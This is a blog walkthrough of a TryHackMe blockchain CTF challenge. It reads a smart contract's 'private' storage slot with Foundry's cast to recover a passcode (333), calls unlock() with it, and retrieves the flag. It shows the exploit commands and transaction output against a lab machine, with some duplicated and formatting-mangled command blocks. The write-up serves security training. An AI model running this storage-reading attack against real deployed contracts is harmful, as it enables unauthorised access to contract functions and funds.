---
title: "Hackfinity: Blockchain: PassCode (TryHackMe)"
datePublished: Fri Aug 01 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmevfmqzj000202jm54ppe4v7
slug: hackfinity-blockchain-passcode-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756387135701/721fa75a-a181-4ec1-97bb-f3f829faa8ba.png
tags: blockchain, rpc, smart-contracts, ctf-writeup, tryhackme-walkthrough

---

In this challenge, we were tasked with breaking into the **DarkInject blockchain** by exploiting weaknesses in their deployed smart contract. The scenario simulated a real-world blockchain security assessment, where we had to interact with Ethereum RPC endpoints, extract contract details, and manipulate contract storage in order to bypass its intended protections. Using tools like `curl`, `jq`, and `cast` from Foundry, we gradually gathered information about the player wallet, the contract address, and the state variables that controlled access. The objective was to unlock the contract and ultimately retrieve the hidden flag.

We may have found a way to break into the DarkInject blockchain, exploiting a vulnerability in their system. This might be our only chance to stop them—for good.

**Note:** To start the target machine, click the Start Machine button:

Start Machine

Wait 1-2 minutes for the target machine to start. Once it has fully booted, the target machine IP will appear here:

`MACHINE_IP`

You can then use the AttackBox or your own machine to attack the target machine's IP address.

Terminal

```bash
root@attacker:~# RPC_URL=http://MACHINE_IP:8545root@attacker:~# API_URL=http://MACHINE_IProot@attacker:~# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")root@attacker:~# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")root@attacker:~# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")root@attacker:~# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`root@attacker:~# echo "Check if is solved: $is_solved"Check if is solved: false
```

**root@attacker:~#** `RPC_URL=http://10.10.234.22:8545`

**root@attacker:~#** `API_URL=http://10.10.234.22`

**root@attacker:~#** `PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")`

**root@attacker:~#** `CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")`

**root@attacker:~#** `PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")`

**root@attacker:~#** `is_solved=cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`

**root@attacker:~#** `echo "Check if is solved: $is_solved"`

**Check if is solved: false**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756386892658/3ea7a575-ab97-4943-bd99-cc203ea07bd3.png align="center")

`RPC_URL=http://10.10.234.22:8545`

`API_URL=http://10.10.234.22`

`PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")`

`CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")`

`cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL` 0x000000000000000000000000000000000000000000000000000000000000014d

`cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy`

blockHash 0xb61c5a421bd6d9522c93a50b8986dd2e2b498716ffa0ff2fe674ffec6af0815e blockNumber 3 contractAddress

cumulativeGasUsed 43123 effectiveGasPrice 1000000000 from 0x6A3d4fFCb67E88f7187FfA9852Ba59F5Bac3dAD6 gasUsed 43123 logs \[\] logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 root

status 1 (success) transactionHash 0xf5cf09b0a70c2e035f1d2bdd6bd223e508406b3ffab47047aa1a501fb61b6aab transactionIndex 0 type 0 blobGasPrice

blobGasUsed

to 0xf22cB0Ca047e88AC996c17683Cee290518093574

`is_solved=`cast call $CONTRACT\_ADDRESS "isSolved()(bool)" --rpc-url ${RPC\_URL}\`\`

`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL`

## **Step 5: Get the flag**

```bash
cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url $RPC_URL
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756386864400/f7209a8a-ca21-438e-98b6-e6904f1b50f3.png align="center")

Through direct interaction with the smart contract’s storage and functions, we successfully exploited the DarkInject blockchain system. By identifying and invoking the vulnerable `unlock(uint256)` function with the correct parameter, we were able to change the internal state and set the challenge as solved. Finally, by calling the `getFlag()` function, we retrieved the flag and completed the mission. This exercise highlighted the importance of secure smart contract design, since improper handling of storage variables and weak logic checks can easily be abused by attackers.